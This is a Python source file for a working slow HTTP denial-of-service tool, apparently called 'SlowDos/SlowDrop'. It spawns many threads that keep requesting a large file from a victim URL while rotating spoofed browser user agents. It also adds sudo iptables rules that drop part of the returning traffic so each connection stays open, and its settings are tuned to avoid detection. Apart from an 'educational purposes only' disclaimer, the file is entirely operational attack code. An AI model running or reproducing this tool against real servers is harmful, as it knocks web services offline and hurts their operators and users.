#!/usr/bin/env python3

import argparse
import os
import random
import re
import sys
import threading
import time

import requests

headers_useragents = []
completed_request_counter = 0
thread_counter = 0
sleepAfterCompleted = 30

#funguje
# list of user agent for HTTP headers
def useragent_list():
    global headers_useragents
    headers_useragents.append(
        'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
    headers_useragents.append(
        'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
    headers_useragents.append(
        'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)')
    headers_useragents.append(
        'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1')
    headers_useragents.append(
        'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19')
    headers_useragents.append(
        'Mozilla/5.0 (Linux; Android 6.0.1; RedMi Note 5 Build/RB3N5C; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991')
    headers_useragents.append(
        'Opera/9.80 (Linux armv7l) Presto/2.12.407 Version/12.51 , D50u-D1-UHD/V1.5.16-UHD (Vizio, D50u-D1, Wireless)')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 OPR/56.0.3051.52')
    headers_useragents.append(
        'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3198.0 Safari/537.36 OPR/49.0.2711.0')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.39')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36 OPR/48.0.2685.52')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_1_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.1 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1')
    headers_useragents.append(
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; CPU OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; U; CPU OS 4_3_5 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Mobile/8L1')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53')
    headers_useragents.append(
        'Mozilla/5.0 (iPad; CPU OS 11_0_3 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A432 Safari/604.1')
    return(headers_useragents)

# HTTP header generation with random user agents from list above
def initHeaders():
    useragent_list()
    global headers_useragents
    headers = {
        'User-Agent': random.choice(headers_useragents),
        'Cache-Control': 'no-cache',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.5,*;q=0.1',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    return headers

# HTTP GET request generation
def sendGET(url):
    global completed_request_counter, lastRequestStatus
    headers = initHeaders()
    try:
        tic = time.time()
        response = requests.get(url, headers=headers)
        if response.ok:  # this line occurs only when the GET request is completely done - file downloaded, status response 200
            toc = time.time()
            done = toc - tic
            completed_request_counter += 1
            print('GET request has been completed in {} seconds'.format(done))
            if (completed_request_counter % 10) == 0:
                print("Completed 10 GET requests (or multiple of).")
            time.sleep(sleepAfterCompleted)
    except:
        pass

# threads generating HTTP GET request
class SendGETThread(threading.Thread):

    def __init__(self, *args, **kwargs):
        super(SendGETThread, self).__init__(*args, **kwargs)
        self._stop = threading.Event()

    def stop(self):
        self._stop.set()

    def stopped(self):
        return self._stop.isSet()

    def run(self):
        try:
            while True:
                if self.stopped():
                    return
                global url
                sendGET(url)
        except:
            pass


def main(argv):
    parser = argparse.ArgumentParser(
        description='SlowDos attack implementation by Pavel Mazanek. For educational purposes only, malicious use is prohibited.')
    parser.add_argument(
        '-url', help='GET request for victim URL (largest possible file). Usage: -url \'<url>\'')
    parser.add_argument(
        '-t', help=' thread counter -- Number of threads generating GET requests - increase according to your HW capabilities and TCP connection limit of target. (20 default)', default=20, type=int)
    parser.add_argument(
        '-tgd', help='Random delay between generating new threads. (upper range float value in seconds, 3 default)', default=3, type=float)
    parser.add_argument(
        '-gn', help='Generate new request after previous completed in X seconds - low values may increase risk of detection. (30 default)', default=30, type=int)
    parser.add_argument(
        '-d', help='Drop rate -- of incoming HTTP traffic - float value between 0.0 and 1.0 (0.40 default)', default=0.40, type=float)
    parser.add_argument(
        '-rem', help='Remove specific drop rate (-rem 0.40 to remove default) iptables rules from previous interrupted attack attempt (rules are automatically removed on keyboard interrupt during attack). ', type=float)
    args = parser.parse_args()
    #def slowDrop(URL,t,tgd,gn,d,rem):
    global url, setupTime, checkTime, thread_counter, dropRate
    sleepAfterCompleted = args.gn
    dropRate = args.d
    # Setup phase of SlowDrop attack
    if args.url:
        print('Adding iptables rules and generating malicious traffic')
        url = args.url
        os.system('sudo iptables -A INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -j ACCEPT')
        os.system('sudo iptables -A INPUT -p tcp --sport 80 -m statistic --mode random --probability {} -j DROP'.format(dropRate))
        try:
            # Attack phase - traffic generating
            while True:
                tic = time.time()
                for i in range(args.t):
                    setupTime = random.uniform(0.0, args.tgd)
                    time.sleep(setupTime)
                    t = SendGETThread()
                    t.start()
                    thread_counter += 1
                    print("Threads generated:    ", thread_counter,
                          "        GET requests completed:    ", completed_request_counter, end='\r')
                    i += 1
                    if i == args.t:
                        toc = time.time()
                        generateTime = "%.2f" % (toc - tic)
                        print("\nGenerating completed in ", generateTime, "seconds. If any GET requests have already been completed (shown above), consider adjusting variables.")
                while True:
                    time.sleep(9999)
        # Closing phase - remove rules from setup of attack
        except KeyboardInterrupt:
            print('\nKilling threads and restoring iptables(this may take some time and raise exceptions - Python has no direct way of killing running threads)')
            os.system('sudo iptables -D INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -j ACCEPT')
            os.system('sudo iptables -D INPUT -p tcp --sport 80 -m statistic --mode random --probability {} -j DROP'.format(dropRate))
            t.stop()
            t.join()
            pass

        if len(sys.argv) == 1:
            parser.print_help()
            exit()
    if args.rem:
        dropRate = args.rem
        os.system('sudo iptables -D INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -j ACCEPT')
        os.system('sudo iptables -D INPUT -p tcp --sport 80 -m statistic --mode random --probability {} -j DROP'.format(dropRate))
        print('iptables rules removed')
        main(sys.argv[1:])

def slowDrop(URL,t,tgd,gn,d):
    global url, setupTime, checkTime, thread_counter, dropRate
    sleepAfterCompleted = gn
    dropRate = d
    # Setup phase of SlowDrop attack
    if URL:
        print('Adding iptables rules and generating malicious traffic')
        url = URL
        os.system('sudo iptables -A INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -j ACCEPT')
        os.system('sudo iptables -A INPUT -p tcp --sport 80 -m statistic --mode random --probability {} -j DROP'.format(dropRate))
        try:
            # Attack phase - traffic generating
            while True:
                tic = time.time()
                for i in range(t):
                    setupTime = random.uniform(0.0, tgd)
                    time.sleep(setupTime)
                    t = SendGETThread()
                    t.start()
                    thread_counter += 1
                    print("Threads generated:    ", thread_counter,
                          "        GET requests completed:    ", completed_request_counter, end='\r')
                    i += 1
                    if i == t:
                        toc = time.time()
                        generateTime = "%.2f" % (toc - tic)
                        print("\nGenerating completed in ", generateTime, "seconds. If any GET requests have already been completed (shown above), consider adjusting variables.")
                while True:
                    time.sleep(9999)
        # Closing phase - remove rules from setup of attack
        except:
            print('\nKilling threads and restoring iptables(this may take some time and raise exceptions - Python has no direct way of killing running threads)')
            os.system('sudo iptables -D INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -j ACCEPT')
            os.system('sudo iptables -D INPUT -p tcp --sport 80 -m statistic --mode random --probability {} -j DROP'.format(dropRate))
            t.stop()
            t.join()
            pass

    #if rem:
     #   dropRate = rem
      #  os.system('sudo iptables -D INPUT -p tcp --tcp-flags SYN,ACK SYN,ACK -j ACCEPT')
       # os.system('sudo iptables -D INPUT -p tcp --sport 80 -m statistic --mode random --probability {} -j DROP'.format(dropRate))
        #print('iptables rules removed')
        # main(sys.argv[1:])

    # parser = argparse.ArgumentParser(
    #     description='SlowDos attack implementation by Pavel Mazanek. For educational purposes only, malicious use is prohibited.')
    # parser.add_argument(
    #     '-url', help='GET request for victim URL (largest possible file). Usage: -url \'<url>\'')
    # parser.add_argument(
    #     '-t', help=' thread counter -- Number of threads generating GET requests - increase according to your HW capabilities and TCP connection limit of target. (20 default)', default=20, type=int)
    # parser.add_argument(
    #     '-tgd', help='Random delay between generating new threads. (upper range float value in seconds, 3 default)', default=3, type=float)
    # parser.add_argument(
    #     '-gn', help='Generate new request after previous completed in X seconds - low values may increase risk of detection. (30 default)', default=30, type=int)
    # parser.add_argument(
    #     '-d', help='Drop rate -- of incoming HTTP traffic - float value between 0.0 and 1.0 (0.40 default)', default=0.40, type=float)
    # parser.add_argument(
    #     '-rem', help='Remove specific drop rate (-rem 0.40 to remove default) iptables rules from previous interrupted attack attempt (rules are automatically removed on keyboard interrupt during attack). ', type=float)
    # args = parser.parse_args()


if __name__ == "__main__":
    if len(sys.argv)==1:
        desc = """{
        "description": "SlowDos attack implementation by Pavel Mazanek",
        "params": [
            {
                "label": "URL",
                "description":"GET request for victim URL (largest possible file)",
                "prefix": "-url",
                "type":"string",
                "required": true
            },
            {
                "label": "Number of threads",
                "prefix": "-t",
                "description":"Number of threads generating GET requests - increase according to your HW capabilities and TCP connection limit of target",
                "type":"numeric",
                "required": true,
                "default": "20"
            },
            {
                "label": "Random delay",
                "prefix": "-tgd",
                "description":"Random delay between generating new threads. (upper range float value in seconds",
                "type":"numeric",
                "required": true,
                "default": 3
            },
            {
                "label": "Delay",
                "prefix": "-gn",
                "description":"Generate new request after previous completed in X seconds - low values may increase risk of detection",
                "type":"numeric",
                "default": 30
            },
            {
                "label": "Drop rate",
                "prefix": "-d",
                "description":"Drop rate -- of incoming HTTP traffic - float value between 0.0 and 1.0 (0.40 default)",
                "type":"numeric",
                "max":"1",
                "default": 0.40
            }
        ]
    }"""
        print(desc)  # list all required parameters
        sys.exit(64)

    main(sys.argv[1:])
